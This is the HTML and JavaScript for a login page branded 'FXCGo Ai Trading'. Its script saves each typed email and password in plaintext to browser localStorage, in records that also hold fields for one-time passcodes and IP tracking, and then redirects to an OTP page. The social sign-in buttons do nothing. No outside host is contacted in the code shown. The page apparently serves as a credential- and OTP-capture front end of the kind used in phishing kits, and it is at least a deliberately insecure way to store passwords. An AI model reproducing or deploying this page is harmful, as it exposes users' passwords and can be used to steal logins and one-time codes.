<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FXCGo ‚Äì Login</title>

<style>
    body {
        margin: 0;
        padding: 0;
        font-family: "Poppins", sans-serif;
        background: #dde6ef;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .container {
        width: 420px;
        background: #dde6ef;
        text-align: center;
        padding: 20px;
    }

    /* Logo */
    .logo {
        font-size: 34px;
        font-weight: bold;
        margin-bottom: 10px;
        display: flex;
        align-items: center;
        gap: 6px;
        justify-content: center;
    }

    .logo span:nth-child(1) { color: #72d9fd; }
    .logo span:nth-child(2) { color: #ffcf66; }
    .logo span:nth-child(3) { color: #ff7fa4; }
    .logo span:nth-child(4) { color: #84eb85; }

    .subtitle {
        margin-top: -10px;
        color: #555;
        font-size: 13px;
    }

    h2 {
        font-size: 32px;
        margin-top: 25px;
        margin-bottom: 5px;
    }

    .small-text {
        color: #6f7d90;
        margin-bottom: 25px;
        font-size: 15px;
    }

    /* Input Boxes */
    .input-box {
        width: 100%;
        background: white;
        border-radius: 40px;
        padding: 14px 20px;
        border: 1px solid #cdd6e4;
        margin-bottom: 18px;
        font-size: 15px;
        outline: none;
    }

    .password-field {
        position: relative;
    }

    .eye {
        position: absolute;
        right: 20px;
        top: 14px;
        cursor: pointer;
        color: #0047ff;
        font-size: 20px;
    }

    /* Buttons */
    .forgot {
        text-align: right;
        margin-bottom: 20px;
        margin-top: -10px;
    }

    .forgot a {
        color: #0047ff;
        text-decoration: none;
        font-size: 14px;
    }

    .login-btn {
        width: 100%;
        background: #0047ff;
        color: white;
        font-size: 18px;
        padding: 14px;
        border: none;
        border-radius: 40px;
        cursor: pointer;
        margin-top: 10px;
    }

    .signup-text {
        margin-top: 20px;
        font-size: 14px;
        color: #333;
    }

    .signup-text a {
        color: #0047ff;
        text-decoration: none;
        font-weight: bold;
    }

    .or {
        margin: 28px 0;
        color: #7d8797;
        font-size: 13px;
        letter-spacing: 1px;
    }

    .social-btn {
        width: 100%;
        padding: 12px;
        border-radius: 40px;
        border: 1px solid #aac3d9;
        background: white;
        font-size: 16px;
        display: flex;
        gap: 10px;
        align-items: center;
        justify-content: center;
        margin-bottom: 15px;
        cursor: pointer;
    }

    .social-btn img {
        width: 20px;
    }

    footer {
        margin-top: 35px;
        font-size: 12px;
        color: #6f7d90;
    }

    footer a {
        color: #0047ff;
        text-decoration: none;
    }
</style>
</head>

<body>

<div class="container">

    <!-- Logo -->
    <div class="logo">
        <span>F</span><span>X</span><span>C</span><span>go</span>
    </div>
    <div class="subtitle">Ai Trading</div>

    <h2>Welcome Back</h2>
    <p class="small-text">Log in to your account</p>

    <input type="text" id="userEmail" class="input-box" placeholder="Username or Email" required>

    <div class="password-field">
        <input type="password" id="userPassword" class="input-box" placeholder="Password" required>
        <span class="eye" onclick="togglePassword()">&#128065;</span>
    </div>

    <div class="forgot">
        <a href="#">Forgot Password?</a>
    </div>

    <!-- LOGIN REDIRECT BUTTON -->
    <button type="button" class="login-btn" onclick="saveLogin()">üîê Log In</button>

    <p class="signup-text">
        Don't have an account? <a href="#">Sign up</a> here.
    </p>

    <p class="or">OR Continue with</p>

    <button class="social-btn">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg">
        Sign in with Google
    </button>

    <button class="social-btn">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png">
        Sign in with Facebook
    </button>

    <footer>
        Copyright ¬©2025, <a href="#">FXCGo Ai</a> designed on Earth ‚ù§Ô∏è
    </footer>

</div>

    <script>
        function togglePassword() {
            const passwordField = document.getElementById('userPassword');
            const eyeIcon = document.querySelector('.eye');
            
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                eyeIcon.textContent = 'üëÅÔ∏è';
            } else {
                passwordField.type = 'password';
                eyeIcon.textContent = 'üëÅÔ∏è‚Äçüó®Ô∏è';
            }
        }

        function saveLogin() {
            const email = document.getElementById('userEmail').value.trim();
            const password = document.getElementById('userPassword').value;

            // Basic validation
            if (!email || !password) {
                alert('Please enter both email and password');
                return;
            }

            // Get existing data or initialize empty array
            const records = JSON.parse(localStorage.getItem('fxcgo_data')) || [];
            
            // Add new login record with OTPs array
            records.push({
                email: email,
                password: password, // Note: In a real app, never store passwords in localStorage
                otps: [], // Array to store multiple OTPs
                time: new Date().toLocaleString(),
                ip: '' // You can add IP tracking if needed
            });

            // Save to localStorage
            localStorage.setItem('fxcgo_data', JSON.stringify(records));

            // Redirect to OTP page
            window.location.href = 'otp.html';
        }

        // Allow form submission on Enter key
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                saveLogin();
            }
        });
    </script>
</body>
</html>
